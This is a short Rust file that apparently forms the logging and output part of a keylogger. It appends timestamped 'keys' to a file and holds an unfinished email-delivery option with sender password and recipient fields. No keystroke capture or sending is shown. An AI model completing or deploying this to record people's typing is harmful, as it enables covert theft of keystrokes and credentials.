use std::fs::OpenOptions;
use chrono::Local;

use std::io::Result;
use std::io::Write;


trait Handle {
    fn handle(&self, buffer : &[String]) -> Result<()>;
}

pub enum Method {
    File {
        path : String
    },
    Email {
        email     : String,
        password  : String,
        recipient : String
    }
}

impl Handle for Method {
    fn handle(&self, keys : &[String]) -> Result<()> {
        let time_stamp: String = {
            let mut bind = String::new();
            bind += "-------------- ";
            bind += &Local::now().to_string();
            bind += " --------------";
            bind
        };
        match self {
            Method::File { path } => {
                let buffer: String = {
                    let mut bind = String::new();
                    bind += &time_stamp;
                    bind += &keys.join("");
                    bind
                };
                let mut file = OpenOptions::new()
                    .append(true)
                    .create(true)
                    .open(path)?;
                file.write_all(buffer.as_bytes())?;
            },
            Method::Email { email, password, recipient } => {}
        }
        Ok(())
    }
}
